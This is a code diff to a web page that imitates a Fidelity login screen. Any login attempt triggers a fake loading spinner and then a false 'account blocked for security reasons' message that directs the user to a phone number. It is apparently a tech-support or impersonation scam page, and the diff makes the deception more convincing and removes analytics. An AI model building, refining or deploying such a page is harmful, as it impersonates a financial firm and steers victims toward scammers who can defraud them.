@@ -1,15 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-9Y8MCNE5XF"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-9Y8MCNE5XF');
-</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fidelity Login</title>
@@ -49,7 +40,7 @@
         .header-links a {
             text-decoration: none;
             color: #4B4B4B;
-            margin-left: 20px; /* Spacing between links */
+            margin-left: 20px;
             margin-right: 20px;
         }
 
@@ -62,10 +53,10 @@
             padding: 40px;
             border-radius: 8px;
             box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
-            width: 90%; /* Full width for mobile */
-            max-width: 400px; /* Max width for desktop */
+            width: 90%;
+            max-width: 400px;
             text-align: center;
-            margin-top: 60px; /* Adjust margin for header */
+            margin-top: 60px;
         }
 
         .container h2 {
@@ -146,6 +137,17 @@
             font-size: 14px;
         }
 
+        /* Loading GIF styles */
+        .loading-container {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .loading-container img {
+            width: 50px;
+        }
+
         /* Media Queries for Responsiveness */
         @media (max-width: 600px) {
             header {
@@ -153,17 +155,17 @@
             }
 
             .header-links a {
-                margin-left: 10px; /* Less spacing on mobile */
+                margin-left: 10px;
                 margin-right: 10px;
             }
 
             .container {
-                padding: 20px; /* Less padding on mobile */
+                padding: 20px;
             }
 
             .login-btn {
-                padding: 10px; /* Smaller button on mobile */
-                font-size: 14px; /* Smaller font on mobile */
+                padding: 10px;
+                font-size: 14px;
             }
         }
     </style>
@@ -192,6 +194,7 @@
                 <label for="password">Password</label>
                 <input type="password" id="password" name="password" placeholder="Password">
                 <div id="error-message" class="error"></div> <!-- Error message block -->
+		
             </div>
             <div class="form-group">
                 <input type="checkbox" id="remember" name="remember">
@@ -202,6 +205,12 @@
                 <a href="#">Forgot username or password?</a>
             </div>
         </form>
+        
+        <!-- Loading GIF -->
+        <div class="loading-container" id="loading">
+            <img src="loading-green-loading.gif" alt="Loading...">
+            <p>Logging in...</p>
+        </div>
     </div>
 
     <!-- Signup link outside the container -->
@@ -209,7 +218,7 @@
         New to Fidelity? <a href="#">Open an account or sign up.</a>
     </div>
 
-        <script>
+    <script>
         // Function to save username to localStorage if "Remember my username" is checked
         function saveUsername() {
             const username = document.getElementById('username').value;
@@ -233,21 +242,33 @@
 
         // Show error message on login attempt
         function showErrorMessage() {
-           const errorMessage = document.getElementById('error-message');
-errorMessage.innerHTML = 'Error Code : 00X47800<br> Your account has been blocked due to security reasons. <br>Contact Support: <a href="tel:+1-844-499-1812">+1-844-499-1812</a>';
-    }
+            const errorMessage = document.getElementById('error-message');
+            errorMessage.innerHTML = 'Error Code : 00X47800<br> Your account has been blocked due to security reasons. <br>Contact Support: <a href="tel:+18444991812">+1-844-499-1812</a>';
+        }
 
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            // Show error message after 2 seconds
+            // Show loading GIF
+            const loading = document.getElementById('loading');
+            loading.style.display = 'block';
+
+            // Hide form
+            const form = document.getElementById('loginForm');
+            form.style.display = 'none';
+
+            // Simulate loading and show error message after 2 seconds
             setTimeout(function() {
-                showErrorMessage();
-            }, 2000); // 2000ms = 2 seconds
+                loading.style.display = 'none'; // Hide loading GIF
+                form.style.display = 'block'; // Show form again
+                showErrorMessage(); 
+// Show error message
+            }, 2000);
 
             // Save the username if remember is checked
             saveUsername();
+
         });
 
         // Load remembered username on page load
